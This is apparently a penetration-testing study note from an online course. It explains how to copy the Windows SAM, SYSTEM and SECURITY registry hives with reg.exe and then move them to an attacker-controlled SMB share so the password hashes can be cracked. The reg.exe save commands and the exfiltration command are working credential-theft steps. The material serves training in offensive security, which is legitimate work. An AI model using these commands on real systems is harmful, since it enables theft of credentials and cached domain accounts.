# Copying SAM Registry Hives
There are three registry hives that we can copy if we have local admin access on the target; each will have a specific purpose when we get to dumping and cracking the hashes. Here is a brief description of each in the table below:

![image](https://github.com/offensivecyber03/htbacademy/assets/71892943/ffec8edc-1f07-4ad2-b0d6-ff610b1a97fb)
We can create backups of these hives using the reg.exe utility.

We have to launch cmd as admin in order to copy hives:
Commands to copy:
```bash
reg.exe save hklm\sam C:\sam.save
```
```bash
reg.exe save hklm\system C:\system.save
```
```bash
reg.exe save hklm\security C:\security.save
```
Technically we will only need hklm\sam & hklm\system, but hklm\security can also be helpful to save as it can contain hashes associated with cached domain user account credentials present on domain-joined hosts.

## Tarnsfer file
We can create ftp, http or smb server to transfer these files to our linux machine.

**Transfering to smb share from windows:**
`move sam.save \\IP\sharename` same for system.save and security.save
